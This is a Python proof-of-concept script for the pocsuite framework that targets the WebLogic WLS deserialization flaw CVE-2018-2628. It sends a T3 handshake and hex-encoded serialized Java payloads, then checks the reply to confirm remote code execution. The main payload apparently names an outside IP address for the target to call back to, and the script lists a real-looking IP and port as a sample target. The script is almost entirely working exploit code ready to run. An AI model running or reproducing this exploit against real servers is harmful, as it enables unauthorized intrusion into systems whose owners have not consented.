#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : jeffzhang
# @Time    : 2018/04/19
# @File    : _180418_WebLogic_wls_all_RCE.py
# @Desc    : "高危的Weblogic反序列化漏洞(CVE-2018-2628) 通过该漏洞 攻击者可以在未授权的情况下远程执行代码"

import socket
import time
import re
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    vulID = '00003'
    version = '1'
    author = 'jeffzhang'
    vulDate = '2018-04-19'
    createDate = '2018-04-20'
    updateDate = '2018-04-20'
    references = ['']
    name = 'WebLogic WLS核心组件反序列化漏洞'
    appPowerLink = 'https://www.oracle.com/middleware/weblogic/index.html'
    appName = 'WebLogic'
    appVersion = 'All'
    vulType = 'RCE'
    desc = '''反序列化漏洞'''
    samples = ['103.54.173.29:9000']

    def _verify(self):
        def _handshake(s_socket, target_add):
            s_socket.connect(target_add)
            s_socket.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
            time.sleep(1)
            s_socket.recv(1024)

        def _build_request_obj(s_socket, payload_data):
            for payload_d in payload_data:
                s_socket.send(payload_d.decode('hex'))
            time.sleep(2)
            response = len(sock.recv(2048))
            return response

        def _send_evil_data(s_socket, payload_data):
            payload_evil = ("056508000000010000001b0000005d0101007372017870737202787000000000000000007572037870000000"
                            "00787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f6769"
                            "6306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f"
                            "52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced000573"
                            "72001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078"
                            "707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe0100"
                            "00aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4"
                            "f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf0103000349001163617061"
                            "63697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400"
                            "135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000")
            payload_evil += payload_data
            payload_evil += ("fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436"
                             "f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e42"
                             "6173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6"
                             "f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c00"
                             "0078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e5"
                             "5736572496e666f3b290000001b7878fe00ff")
            payload_evil = '%s%s' % ('{:08x}'.format(len(payload_evil) / 2 + 4), payload_evil)
            s_socket.send(payload_evil.decode('hex'))
            time.sleep(2)
            s_socket.send(payload_evil.decode('hex'))
            res = ''
            try:
                while True:
                    res += s_socket.recv(4096)
                    time.sleep(0.1)
            except Exception as e:
                pass
            return res

        result = {}
        payload = ("aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176"
                   "612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e67"
                   "2f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e736572766572"
                   "2e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176"
                   "612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e69636173"
                   "74526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078")

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(4)
        target_ip = self.url.split(':')[1].strip("/")
        target_port = int(self.url.split(':')[2].strip("/"))
        target = (target_ip, target_port)

        payload_data1 = ("000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2"
                         "aebfc607499b4027973720078720178720278700000000a00000003000000000000000600707070707070000000"
                         "0a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c617"
                         "3735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e"
                         "7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f724"
                         "9000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f726172795061746368"
                         "4c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7"
                         "271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765"
                         "626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c0000787072002477656"
                         "26c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b"
                         "00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616"
                         "765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b"
                         "001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e6"
                         "96e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f"
                         "7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f726172795061746"
                         "3684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c5665"
                         "7273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6"
                         "173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e69"
                         "6e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000"
                         "c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00"
                         "087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b61676"
                         "5496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f"
                         "972245516452463e0200035b00087061636b6167657371")
        payload_data2 = ("007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b00127"
                         "6657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e74"
                         "65726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f72490"
                         "00c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c"
                         "0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c566572736"
                         "96f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a56"
                         "4d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e3232370012574"
                         "94e2d4147444d565155423154362e656883348cd6000000070000{0}fffffffffffffffffffffffffffffffffff"
                         "fffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e"
                         "2a0c0000787077200114dc42bd07".format('{:04x}'.format(target_port)))
        payload_data3 = '1a7727000d3234322e323134'
        payload_data4 = '2e312e32353461863d1d0000000078'
        payload_data_list = [payload_data1, payload_data2, payload_data3, payload_data4]

        try:
            _handshake(sock, target)

            try:
                result_sock = _build_request_obj(sock, payload_data_list)
                if result_sock == 0:
                    pass
                else:
                    respond = _send_evil_data(sock, payload)
                    re_result = re.findall('\\$Proxy[0-9]+', respond, re.S)
                    if len(re_result) > 0:
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['url'] = target_ip
                        result['VerifyInfo']['port'] = target_port
                        result['VerifyInfo']['result'] = re_result
            except Exception as e:
                # print(e)
                pass
        except Exception as e:
            # print(e)
            pass
        sock.close()
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail("hahaha")
        return output


register(TestPOC)
